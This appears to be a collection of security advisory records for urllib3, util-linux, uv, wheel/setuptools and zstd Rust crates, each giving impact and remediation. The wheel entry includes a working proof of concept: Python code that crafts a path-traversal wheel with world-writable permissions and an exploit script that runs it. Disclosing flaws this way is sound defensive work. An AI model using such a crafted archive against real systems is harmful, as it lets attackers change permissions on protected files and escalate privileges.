### Impact

urllib3's streaming API is designed for the efficient handling of large HTTP responses by reading content in chunks instead of loading the entire response body into memory at once.

urllib3 can decompress response bodies according to the HTTP `Content-Encoding` header. When streaming a compressed, chunked response, urllib3 first consumes data already buffered by the decoder before reading the next HTTP chunk.

However, urllib3 versions from 2.6.2 through 2.7.0 could enter an infinite loop when a chunked response contained bytes after the end of the Deflate stream. If the decompressed body exceeded the requested streaming chunk size, Python's zlib implementation could retain the trailing bytes as unconsumed input after reaching the end of the compressed stream. urllib3 would repeatedly attempt to decode those same bytes without making progress or reading more data from the network.

A malicious server could exploit this behavior to cause excessive CPU usage and prevent the affected request from completing on the client. Network read timeouts would not interrupt the loop because no further socket operation was required.

### Affected usages

Applications and libraries using urllib3 versions 2.6.2 through 2.7.0 may be affected when all of the following conditions are met:

1. Compressed responses from an untrusted source are streamed using `HTTPResponse.stream(amt=N)` or `HTTPResponse.read_chunked(amt=N)` with a positive, finite chunk size.
2. Content decoding is enabled.
3. The response uses both `Transfer-Encoding: chunked` and `Content-Encoding: deflate`.
4. The decoded body exceeds the requested chunk size and the encoded body contains bytes after the end of the Deflate stream.

`HTTPResponse.stream()` uses a finite chunk size by default and is therefore affected when the other conditions are met.

### Remediation

Upgrade to urllib3 2.8.0, in which the Deflate decoder stops accepting input after reaching the end of the compressed stream and no longer reports trailing bytes as data that can produce more decoded output.

If upgrading is not immediately possible, disable automatic content decoding for responses from untrusted sources by setting `decode_content=False`, or reject streamed responses using the Deflate content encoding. Applications that disable automatic decoding must handle the compressed response safely at another layer.
vulnerabilities.summary: urllib3: Chunked Deflate streaming can enter an infinite loop

vulnerabilities.details:
## Impact

urllib3's [streaming API](https://urllib3.readthedocs.io/en/2.7.0/advanced-usage.html#streaming-and-i-o) is designed for efficiently handling large HTTP responses by reading the content in chunks, rather than loading the entire response body into memory at once. When decoding a [chunked-transfer-encoded response](https://httpwg.org/specs/rfc9112.html#chunked.encoding), this API reads each chunk's size field by buffering until it sees `\n` or EOF.

A malicious HTTP server can return `Transfer-Encoding: chunked` and then send a very long run of bytes without any newline, causing the streaming client to buffer that entire run before urllib3 can reject the chunk size as invalid and allocate more memory than intended.

To fix the issue, we'll reject chunk-size fields larger than 65536 bytes, as already done in the non-streaming case, which is currently handled by the Python standard library. Note that this only applies to reading the chunk-size field, not the chunk data, which is already handled correctly. Thus, there shouldn't be any impact for non-malicious servers.

## Affected usages

Applications and libraries using urllib3 versions earlier than 2.8.0 may be affected when streaming a chunked response from untrusted sources. Specifically, this affects the [read_chunked()](https://urllib3.readthedocs.io/en/stable/reference/urllib3.response.html#urllib3.response.BaseHTTPResponse.read_chunked) and [stream()](https://urllib3.readthedocs.io/en/stable/reference/urllib3.response.html#urllib3.response.BaseHTTPResponse.stream) methods of the HTTPResponse object.

This also affects requests streaming API, which uses urllib3 under the hood.

## Remediation

Upgrade to urllib3 version 2.8.0 or later, where chunk-size fields larger than 65536 will be rejected. If upgrading is not immediately possible, consider reading the response at once using the [read()](https://urllib3.readthedocs.io/en/stable/reference/urllib3.response.html#urllib3.response.BaseHTTPResponse.read) method.
vulnerabilities.summary: urllib3: HTTPResponse.stream()/read_chunked() buffers an unbounded chunk-size line into memory

vulnerabilities.details:
It was discovered that libblkid in util-linux had a heap use-after-free
vulnerability during nested partition probing. An attacker who could
present a crafted block device image could possibly use this issue to
obtain sensitive information or cause a denial of service. (CVE-2026-13595)

It was discovered that the mount utility in util-linux had a time-of-check-
time-of-use vulnerability when setting up loop devices. A local attacker
could possibly use this issue to obtain unauthorized read access to root-
protected files and block devices. (CVE-2026-27456)

It was discovered that the login utility in util-linux improperly
canonicalized hostnames when invoked with the -h option. A remote attacker
could possibly use this issue to bypass host-based access control rules.
This issue only affected Ubuntu 26.04 LTS. (CVE-2026-3184)

It was discovered that libmount in util-linux had a time-of-check-time-of-
use vulnerability in its ownership hook. A local attacker could possibly
use this issue to gain elevated privileges. This issue only affected Ubuntu
24.04 LTS and Ubuntu 26.04 LTS. (CVE-2026-53612)

It was discovered that libmount in util-linux had a time-of-check-time-of-
use vulnerability that allowed target path redirection during mount
operations. A local attacker could possibly use this issue to gain elevated
privileges. (CVE-2026-53613)

It was discovered that libmount in util-linux improperly handled the
LIBMOUNT_FORCE_MOUNT2 environment variable in the SUID mount utility. A
local attacker could possibly use this issue to bypass nosuid and noexec
mount options and gain elevated privileges. This issue only affected Ubuntu
24.04 LTS and Ubuntu 26.04 LTS. (CVE-2026-53614)

It was discovered that libblkid in util-linux had an integer overflow
vulnerability when parsing DOS partition tables. An attacker who could
present a crafted block device image could possibly use this issue to cause
a denial of service. (CVE-2026-53615)
vulnerabilities.summary: util-linux vulnerabilities

vulnerabilities.details: A flaw was found in the libblkid library of util-linux. During nested partition probing, the BSD, Minix, Solaris x86, and UnixWare partition probers cache a raw pointer to a parent partition entry in a dynamically allocated array. When subsequent partition additions cause the array to be reallocated, this pointer becomes stale, leading to a heap use-after-free read. An attacker who can present a crafted block device image (for example, via USB insertion or a loop-mounted disk image) can trigger this flaw without user interaction, as libblkid is invoked automatically by udev/udisks as root on block-device hot-plug events. This could lead to limited information disclosure or denial of service.

util-linux is a random collection of Linux utilities. Prior to version 2.41.4, a TOCTOU (Time-of-Check-Time-of-Use) vulnerability has been identified in the SUID binary /usr/bin/mount from util-linux. The mount binary, when setting up loop devices, validates the source file path with user privileges via fork() + setuid() + realpath(), but subsequently re-canonicalizes and opens it with root privileges (euid=0) without verifying that the path has not been replaced between both operations. Neither O_NOFOLLOW, nor inode comparison, nor post-open fstat() are employed. This allows a local unprivileged user to replace the source file with a symlink pointing to any root-owned file or device during the race window, causing the SUID binary to open and mount it as root. Exploitation requires an /etc/fstab entry with user,loop options whose path points to a directory where the attacker has write permission, and that /usr/bin/mount has the SUID bit set (the default configuration on virtually all Linux distributions). The impact is unauthorized read access to root-protected files and block devices, including backup images, disk volumes, and any file containing a valid filesystem. This issue has been patched in version 2.41.4.

A flaw was found in util-linux. Improper hostname canonicalization in the `login(1)` utility, when invoked with the `-h` option, can modify the supplied remote hostname before setting `PAM_RHOST`. A remote attacker could exploit this by providing a specially crafted hostname, potentially bypassing host-based Pluggable Authentication Modules (PAM) access control rules that rely on fully qualified domain names. This could lead to unauthorized access.

util-linux is a random collection of Linux utilities. In util-linux 2.39 through 2.41.4 and 2.42 through 2.42.1, the SUID `mount` utility's `hook_owner.c` post-mount hook performs path-based `chmod()` and `lchown()` operations on a previously validated mount target. A local low-privileged user authorized by an `/etc/fstab` entry with `user` or `users` and an `X-mount.mode`, `X-mount.owner`, or `X-mount.group` option can use `renameat2(RENAME_EXCHANGE)` to race a writable ancestor of the target and redirect the privileged ownership or mode change to a root-owned path, potentially gaining root privileges. This issue is fixed in 2.41.5 and 2.42.2.

util-linux is a random collection of Linux utilities. In util-linux 2.17 through 2.41.6 and 2.42 through 2.42.3, and in 2.42.4 when the legacy `mount(2)` path is used without `/proc`, restricted non-root `mount` requests validate an `/etc/fstab` target before the mount operation re-resolves that pathname. A local low-privileged user authorized by an fstab `user` or `users` entry whose target has an attacker-writable ancestor can use `renameat2(RENAME_EXCHANGE)` to swap a path component and redirect an authorized mount to a root-owned location, such as mounting attacker-controlled content over `/etc/sudoers.d`, and thereby gain root privileges. Versions 2.41.5 and 2.42.2 pin targets for the new mount API, and 2.42.4 pins legacy targets through `/proc/self/fd`; the documented legacy fallback without `/proc` remains affected.

util-linux is a random collection of Linux utilities. In util-linux 2.39.1 through 2.41.4 and 2.42 through 2.42.1, the SUID `mount` utility reads the attacker-controlled `LIBMOUNT_FORCE_MOUNT2` environment variable with `getenv()`, allowing a local low-privileged user to force the non-atomic legacy bind-mount path. With an `/etc/fstab` bind mount authorized by `user` or `users` and protected by `nosuid`, `noexec`, or `nodev`, an attacker can race the window between the initial bind mount and the remount that applies those security flags and execute a SUID program from the temporarily unprotected mount, potentially gaining root privileges. This issue is fixed in 2.41.5 and 2.42.2.

util-linux is a random collection of Linux utilities. Before util-linux 2.41.4, `parse_dos_extended()` in `libblkid/src/partitions/dos.c` computes an extended-partition start sector with 32-bit addition and does not apply the extended-area bounds checks to the first two EBR entries. A local attacker who causes a crafted DOS extended-partition disk image or removable medium to be probed can wrap `cur_start + start` to sector zero and cause libblkid to report a false partition overlapping the MBR. This directly compromises the integrity of the reported partition metadata; disk modification or availability loss requires a separate downstream consumer to act on that metadata. This issue is fixed in 2.41.4.

util-linux versions through 2.41.5 and 2.42.2 fail to check mount helper exit status before running post-mount hooks, allowing unprivileged users to execute privileged operations on pre-existing filesystems. Attackers can exploit X-mount.idmap or X-mount.owner hooks to clone filesystems with inherited suid bits or modify target inode permissions after a helper fails, achieving privilege escalation.

The nsenter --join-cgroup option opens the target cgroup.procs file as root and leaves that file descriptor open across later namespace and credential changes and across execve(). Because the kernel checks later cgroup migrations using the credentials from the original open, a program run in an attacker-controlled target can inherit root's ability to move host processes between cgroups. After a privileged operator uses --join-cgroup against that target, an unprivileged user can migrate and terminate unrelated root processes.

The X-mount.subdir option uses a detached-tree fast path on Linux 6.15 and later and passes the configured subdirectory to open_tree() with AT_SYMLINK_NOFOLLOW. That flag does not stop intermediate symlink traversal or keep resolution inside the newly mounted filesystem. A local unprivileged user with an fstab-authorized X-mount.subdir entry can attach a host path at the intended mountpoint.

A flaw was found in util-linux. Restricted bind mounts take the source path from fstab but do not pin that source before the privileged mount. A local unprivileged user who can replace the authorized source or a writable ancestor can redirect SUID mount(8) to bind another host directory. If the fstab entry also sets X-mount.owner, X-mount.group, or X-mount.mode, root then changes ownership or mode on that redirected inode.

By default, uv verifies TLS connections against a vendored copy of the `webpki-root-certs` bundle. Versions before 0.13.4 include the `emSign ECC Root CA - G3` root. Eight eMudhra intermediate CA certificates that chain to that root have compromised private keys, and the CA has revoked them.

An attacker with one of the compromised keys can issue certificates that uv accepts for any hostname, and can be used to issue certificates to enable MITM attacks.

uv 0.13.4 removes the root from its vendored bundle, following `webpki-root-certs` 1.0.10. Upgrade to 0.13.4 or later.
vulnerabilities.summary: uv's bundled CA store trusts an emSign root whose intermediate CA keys are compromised

vulnerabilities.details:
Affected versions include `emSign ECC Root CA - G3`, which can allow certificate
paths through distrusted emSign intermediates.

Affected versions may accept certificate paths containing distrusted emSign
intermediate public keys. The private keys corresponding to these intermediates
are now well known.

Version 1.0.10+ removes this root.

Version 0.26.11 is a compatibility wrapper that re-exports
`parent::TLS_SERVER_ROOT_CERTS` from its `webpki-root-certs` 1.x dependency; it
contains no separate root certificate list. Its resolved 1.x dependency must be
updated to 1.0.10 or later.
vulnerabilities.summary: Bundled root certificates allow trust in distrusted emSign intermediates

vulnerabilities.details: ### Summary - **Vulnerability Type:** Path Traversal (CWE-22) leading to Arbitrary File Permission Modification. - **Root Cause Component:** wheel.cli.unpack.unpack function. - **Affected Packages:** 1. wheel (Upstream source) 2. setuptools (Downstream, vendors wheel) - **Severity:** High (Allows modifying system file permissions). ### Details The vulnerability exists in how the unpack function handles file permissions after extraction. The code blindly trusts the filename from the archive header for the chmod operation, even though the extraction process itself might have sanitized the path. ``` # Vulnerable Code Snippet (present in both wheel and setuptools/_vendor/wheel) for zinfo in wf.filelist: wf.extract(zinfo, destination) # (1) Extraction is handled safely by zipfile # (2) VULNERABILITY: # The 'permissions' are applied to a path constructed using the UNSANITIZED 'zinfo.filename'. # If zinfo.filename contains "../", this targets files outside the destination. permissions = zinfo.external_attr >> 16 & 0o777 destination.joinpath(zinfo.filename).chmod(permissions) ``` ### PoC I have confirmed this exploit works against the unpack function imported from setuptools._vendor.wheel.cli.unpack. **Prerequisites:** pip install setuptools **Step 1: Generate the Malicious Wheel (gen_poc.py)** This script creates a wheel that passes internal hash validation but contains a directory traversal payload in the file list. ``` import zipfile import hashlib import base64 import os def urlsafe_b64encode(data): """ Helper function to encode data using URL-safe Base64 without padding. Required by the Wheel file format specification. """ return base64.urlsafe_b64encode(data).rstrip(b'=').decode('ascii') def get_hash_and_size(data_bytes): """ Calculates SHA-256 hash and size of the data. These values are required to construct a valid 'RECORD' file, which is used by the 'wheel' library to verify integrity. """ digest = hashlib.sha256(data_bytes).digest() hash_str = "sha256=" + urlsafe_b64encode(digest) return hash_str, str(len(data_bytes)) def create_evil_wheel_v4(filename="evil-1.0-py3-none-any.whl"): print(f"[Generator V4] Creating 'Authenticated' Malicious Wheel: {filename}") # 1. Prepare Standard Metadata Content # These are minimal required contents to make the wheel look legitimate. wheel_content = b"Wheel-Version: 1.0\nGenerator: bdist_wheel (0.37.1)\nRoot-Is-Purelib: true\nTag: py3-none-any\n" metadata_content = b"Metadata-Version: 2.1\nName: evil\nVersion: 1.0\nSummary: PoC Package\n" # 2. Define Malicious Payload (Path Traversal) # The content doesn't matter, but the path does. payload_content = b"PWNED by Path Traversal" # [ATTACK VECTOR]: Target a file OUTSIDE the extraction directory using '../' # The vulnerability allows 'chmod' to affect this path directly. malicious_path = "../../poc_target.txt" # 3. Calculate Hashes for Integrity Check Bypass # The 'wheel' library verifies if the file hash matches the RECORD entry. # To bypass this check, we calculate the correct hash for our malicious file. wheel_hash, wheel_size = get_hash_and_size(wheel_content) metadata_hash, metadata_size = get_hash_and_size(metadata_content) payload_hash, payload_size = get_hash_and_size(payload_content) # 4. Construct the 'RECORD' File # The RECORD file lists all files in the wheel with their hashes. # CRITICAL: We explicitly register the malicious path ('../../poc_target.txt') here. # This tricks the 'wheel' library into treating the malicious file as a valid, verified component. record_lines = [ f"evil-1.0.dist-info/WHEEL,{wheel_hash},{wheel_size}", f"evil-1.0.dist-info/METADATA,{metadata_hash},{metadata_size}", f"{malicious_path},{payload_hash},{payload_size}", # <-- Authenticating the malicious path "evil-1.0.dist-info/RECORD,," ] record_content = "\n".join(record_lines).encode('utf-8') # 5. Build the Zip File with zipfile.ZipFile(filename, "w") as zf: # Write standard metadata files zf.writestr("evil-1.0.dist-info/WHEEL", wheel_content) zf.writestr("evil-1.0.dist-info/METADATA", metadata_content) zf.writestr("evil-1.0.dist-info/RECORD", record_content) # [EXPLOIT CORE]: Manually craft ZipInfo for the malicious file # We need to set specific permission bits to trigger the vulnerability. zinfo = zipfile.ZipInfo(malicious_path) # Set external attributes to 0o777 (rwxrwxrwx) # Upper 16 bits: File type (0o100000 = Regular File) # Lower 16 bits: Permissions (0o777 = World Writable) # The vulnerable 'unpack' function will blindly apply this '777' to the system file. zinfo.external_attr = (0o100000 | 0o777) << 16 zf.writestr(zinfo, payload_content) print("[Generator V4] Done. Malicious file added to RECORD and validation checks should pass.") if __name__ == "__main__": create_evil_wheel_v4() ``` **Step 2: Run the Exploit (exploit.py)** ``` from pathlib import Path import sys # Demonstrating impact on setuptools try: from setuptools._vendor.wheel.cli.unpack import unpack print("[*] Loaded unpack from setuptools") except ImportError: from wheel.cli.unpack import unpack print("[*] Loaded unpack from wheel") # 1. Setup Target (Read-Only system file simulation) target = Path("poc_target.txt") target.write_text("SENSITIVE CONFIG") target.chmod(0o400) # Read-only print(f"[*] Initial Perms: {oct(target.stat().st_mode)[-3:]}") # 2. Run Vulnerable Unpack # The wheel contains "../../poc_target.txt". # unpack() will extract safely, BUT chmod() will hit the actual target file. try: unpack("evil-1.0-py3-none-any.whl", "unpack_dest") except Exception as e: print(f"[!] Ignored expected extraction error: {e}") # 3. Check Result final_perms = oct(target.stat().st_mode)[-3:] print(f"[*] Final Perms: {final_perms}") if final_perms == "777": print("VULNERABILITY CONFIRMED: Target file is now world-writable (777)!") else: print("[-] Attack failed.") ``` **result:** ### Impact Attackers can craft a malicious wheel file that, when unpacked, changes the permissions of critical system files (e.g., /etc/passwd, SSH keys, config files) to 777. This allows for Privilege Escalation or arbitrary code execution by modifying now-writable scripts. ### Recommended Fix The unpack function must not use zinfo.filename for post-extraction operations. It should use the sanitized path returned by wf.extract(). ### Suggested Patch: ``` # extract() returns the actual path where the file was written extracted_path = wf.extract(zinfo, destination) # Only apply chmod if a file was actually written if extracted_path: permissions = zinfo.external_attr >> 16 & 0o777 Path(extracted_path).chmod(permissions) ```
vulnerabilities.summary: Wheel Affected by Arbitrary File Permission Modification via Path Traversal in wheel unpack

vulnerabilities.details:
The `zbus_names` crate is no longer maintained as a standalone crate.

It has been merged into [`zbus`](https://crates.io/crates/zbus) starting with version `6.0.0`, as its `names` module.

Users should migrate to [`zbus`](https://crates.io/crates/zbus), with its default features disabled if they only need the D-Bus name types.
vulnerabilities.summary: `zbus_names` is unmaintained

vulnerabilities.details:
The `with_context` constructors of the stream encoders and decoders used the
borrowed context as it was. When a stream was abandoned on a context, for
example an encoder dropped before `finish()` after an error, whatever it
left there was carried into the next stream: the input buffered by the
previous encoder (up to 128 KiB, or all of it with `zstdmt`) became the
start of the next frame, and a decoder returned undelivered output of the
previous stream.

An application reusing one context for data that must stay separate, such
as different users' requests, could disclose one user's plaintext to
another. Whoever supplies the data can cause the abandonment with invalid
input.

The flaw was corrected by resetting the context's session in
`with_context`.
vulnerabilities.summary: Data from an abandoned stream leaks into the next stream on a reused context

vulnerabilities.details:
With `CParameter::StableInBuffer(true)` (`experimental` feature), the C
library keeps a pointer to the input of one streaming call and reads from it
in later calls, including `flush_stream` and `end_stream`, which take no
input. An `InBuffer` only borrows its slice for one call, so safe code could
free it in between, and freed memory was compressed into the frame. The C
library behaves this way since zstd 1.5.4, whether bundled or linked from the
system.

The flaw was corrected by refusing to enable the parameter.
vulnerabilities.summary: Use-after-free with `CParameter::StableInBuffer`

vulnerabilities.details:
`Seekable` did not record whether it was initialized. On a fresh `Seekable`,
or one whose `init_buff()` failed, `decompress`, `offset_to_frame_index` and
`frame_decompressed_size` made the C library read a NULL seek table. After a
failed re-initialization, `decompress` returned data from the refused buffer
using the previous seek table.

Separately, `frame_decompressed_size(num_frames())`, on `Seekable` and
`SeekTable`, read one entry past the end of the seek table.

The flaw was corrected by refusing to use a `Seekable` until an
initialization succeeded, and by checking the frame index.
vulnerabilities.summary: `Seekable` reads a NULL or out-of-bounds seek table

vulnerabilities.details:
`OutBuffer::around_pos` accepted a position past the initialized length of a
`Vec<u8>`. The next streaming call then marked everything before the
position as initialized, so safe code could read stale heap memory between
the vector's previous length and that position.

The flaw was corrected by zero-filling that gap.
vulnerabilities.summary: `OutBuffer::around_pos` exposes uninitialized memory

vulnerabilities.details:
`ZSTD_seekable_decompress` shortens the requested length to the end of the
data without checking that the offset is before it. For an offset past the
end, it returns a wrapped-around length without writing anything, and
`Seekable::decompress` passed that length to `Vec::set_len`.

With the `seekable` feature, whoever supplies the archive, or chooses the
offset, can leave the caller's `Vec<u8>` with a length far beyond its
capacity. Reading it then discloses neighbouring heap memory, and appending
to it corrupts memory. Offsets near `u64::MAX` can also hang the call.

The flaw was corrected by clamping requests to the end of the data, and by
checking every count reported by the C library against the buffer capacity.
vulnerabilities.summary: `Seekable::decompress` sets a `Vec` length beyond its capacity for offsets past the end

vulnerabilities.details:
`CCtx::init_using_cdict` and `DCtx::init_using_ddict` (`experimental`
feature, deprecated) took the dictionary as `&CDict<'b>` and `&DDict<'b>`
with only `'b: 'a`, so the dictionary itself could be dropped while the
context still pointed at it. The same mistake in other constructors was
fixed earlier (<https://github.com/gyscos/zstd-rs/issues/365>).

The flaw was corrected by taking `&'a CDict<'b>` and `&'a DDict<'b>`.
vulnerabilities.summary: Use-after-free through `init_using_cdict` and `init_using_ddict`

vulnerabilities.details:
The one-shot `DCtx` and `CCtx` methods assumed the C library resets the
context, but it leaves an open stream as it is. When a stream was left
unfinished on a context, a one-shot call such as `decompress_using_dict`
could leave the context pointing at the dictionary borrowed for that call,
and the next streaming call resumed the stream against it after it was
freed: decompressed output then contained freed heap memory. On the
compression side, the stream resumed against the one-shot call's buffers.

This requires an application to use one context for both streaming and
one-shot calls without a reset in between. The flaw was corrected by
resetting the session after one-shot calls whenever a stream may be open.
vulnerabilities.summary: Use-after-free of a dictionary after a one-shot call on a context with an open stream

vulnerabilities.details:
`ZDICT_trainFromBuffer` is never told the length of the samples buffer, so
`train_from_buffer` checked that the sample sizes add up to it. With
overflow checks off, as in release builds, that sum wrapped around: sizes
totalling 2^64 plus the buffer length passed the check, and the trainer read
past the end of the buffer. `zstd::dict::from_continuous` relies on this
check from zstd 0.4.10; older versions of zstd had their own, covered by a
separate advisory.

This requires the sample sizes to come from an untrusted source. The flaw
was corrected by summing the sizes with overflow checks.
vulnerabilities.summary: Out-of-bounds read in `train_from_buffer` when sample sizes overflow

vulnerabilities.details:
`CCtx::try_clone` (`experimental` feature, deprecated) copies tables sized
from the context's applied parameters. Starting a multithreaded frame
(`zstdmt` feature) replaces those parameters with the workers' without
resizing the context's own tables, so after an abandoned single-threaded
frame, the copy wrote up to 512 KiB past a heap allocation, or read past
one. This became reachable with the bundled zstd 1.5.6.

The flaw was corrected by refusing `try_clone` (and the unsafe
`compress_block`) once `NbWorkers` was set on the context.
vulnerabilities.summary: Heap buffer overflow in `CCtx::try_clone` on a multithreaded context

vulnerabilities.details:
When decompression fails inside a legacy (zstd v0.4 to v0.7) frame, the
bundled zstd library reports the output buffer as fully written although
nothing was written. `DCtx::decompress_stream` committed that position even
on error, and for a `Vec<u8>` destination this extended the vector's length
over uninitialized memory.

Legacy support is enabled by default. A 5- or 6-byte corrupt legacy frame is
enough: through `zstd::stream::write::Decoder`, up to 32 KiB of stale heap
memory is then passed to the wrapped writer on the next `write()` or
`flush()`, or when an `auto_flush()`/`on_flush()` decoder is dropped. Whether
this reaches an attacker depends on where the application sends the
decompressed output. `zstd::stream::read::Decoder`, `zstd::decode_all` and
the bulk API are not affected.

Before zstd-safe 4.0.0, output buffers could only be initialized slices.
The zstd crate's own writer had the same flaw from 0.4.22 to 0.7.x, which is
covered by a separate advisory.

The flaw was corrected by only committing the buffer positions of a
successful call.
vulnerabilities.summary: Uninitialized memory exposed when streaming decompression of a legacy frame fails

vulnerabilities.details:
`DCtx::try_clone` (`experimental` feature, deprecated) is a plain copy of the
C context. A context owning a dictionary (from `load_dictionary`,
`ref_prefix` or `init_using_dict`) or a dictionary table (`ref_ddict` with
`RefMultipleDDicts`) ended up with both copies freeing it. A context cloned
mid-frame resumed on uninitialized stream state. The clone also silently lost
the `WindowLogMax` limit.

The flaw was corrected by refusing to clone such contexts, and by carrying
over the parameters the copy leaves out.
vulnerabilities.summary: Double free in `DCtx::try_clone`

vulnerabilities.details:
`InBuffer`'s fields are public, so safe code can set `pos` past the end of
`src`. The position was passed to the C library unchecked, and
`ZSTD_seekable_compressStream`, unlike the other streaming functions, does
not validate it: it read past the end of the input slice, by up to the
frame size, and compressed that memory into the output.

The flaw was corrected by checking the position before every call into the
C library.
vulnerabilities.summary: Out-of-bounds read with an out-of-range `InBuffer::pos`

vulnerabilities.details:
When a multithreaded frame (`zstdmt` feature, `CParameter::NbWorkers`) is
left unfinished, its jobs may still be running on the worker threads: the C
library only waits for them when the next frame starts, or when the context
is freed. A session reset makes the context accept changes again in the
meantime, so:

- unloading the dictionary (`load_dictionary`, `ref_cdict`, `ref_prefix`,
  `disable_dictionary`, `init*`, or `reset` with parameters) freed the
  dictionary a worker was still compressing against;
- changing `NbWorkers` made the next frame resize the job table before
  waiting for the old jobs.

The flaw was corrected by refusing these calls while a multithreaded frame
is unfinished. The new `CCtx::wait_for_workers()` waits for the workers
first.
vulnerabilities.summary: Use-after-free when changing a multithreaded context with an unfinished frame

vulnerabilities.details:
On wasm32, zstd-sys provides `malloc` and `free` to the C library through a
shim over Rust's allocator. The shim did not check for allocation failure:
it wrote its size header to address 0 and returned address 4, which the C
library used as a valid buffer. `free(NULL)` also read below address 0.

Whenever the instance cannot grow its memory by what a frame asks for, a
small crafted frame (a 9-byte header declaring a 128 MiB window is enough)
made decompression write decoded data over the bottom of the module's
linear memory, instead of failing. The corruption stays within the wasm
sandbox.

The flaw was corrected by returning NULL on allocation failure or size
overflow, and by making `free(NULL)` a no-op.
vulnerabilities.summary: WebAssembly allocator shim corrupts memory on allocation failure

vulnerabilities.details:
The `zvariant` crate is no longer maintained as a standalone crate.

It has been merged into [`zbus`](https://crates.io/crates/zbus) starting with version `6.0.0`, as its `wire` module.

Users should migrate to [`zbus`](https://crates.io/crates/zbus), with its default features disabled if they only need the D-Bus wire format. Users of the GVariant format should migrate to [`zgvariant`](https://crates.io/crates/zgvariant).
vulnerabilities.summary: `zvariant` is unmaintained

vulnerabilities.details:
The `zvariant_derive` crate is no longer maintained as a standalone crate.

Its derive macros are provided by [`zbus`](https://crates.io/crates/zbus) starting with version `6.0.0`.

Users should migrate to [`zbus`](https://crates.io/crates/zbus), with its default features disabled if they only need the D-Bus wire format.
vulnerabilities.summary: `zvariant_derive` is unmaintained
